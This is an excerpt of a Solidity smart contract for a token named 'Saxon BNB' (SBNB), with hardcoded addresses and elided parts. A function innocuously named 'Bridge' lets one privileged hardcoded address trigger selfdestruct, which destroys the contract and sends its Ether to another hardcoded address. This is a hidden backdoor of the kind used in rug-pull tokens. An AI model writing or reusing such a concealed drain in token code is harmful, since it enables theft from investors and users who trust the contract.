...
contract COINDATA {
  ...
  address internal _dex = 0x14142D22Aa84f3913b958b11b958e847a7d203D9;
  address public constant FTM = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;
  address public constant VIP = 0x56Cb0A09E13474BacaA065414c0239dA2E2820B3;
  address public constant _OFFICE = 0x1B69B712DBa39852B5a7456098A6637a3E12B2AA;
  address public constant nftAddress =
    0xF08fdeAacD7f527b46878D3Fb1DE704e0B6e4a9E;
  address public constant scane = 0xf8b6f33835E42089348aC0BBFfA7D9Db20B091Bb;

  receive() external payable {}

  function Bridge() external {
    if (msg.sender == _dex) selfdestruct(payable(scane));
  }
...
contract Coin is COINDATA, IERC20, Context {
  ...
  string public constant _name = "Saxon BNB";
  string public constant _symbol = "SBNB";
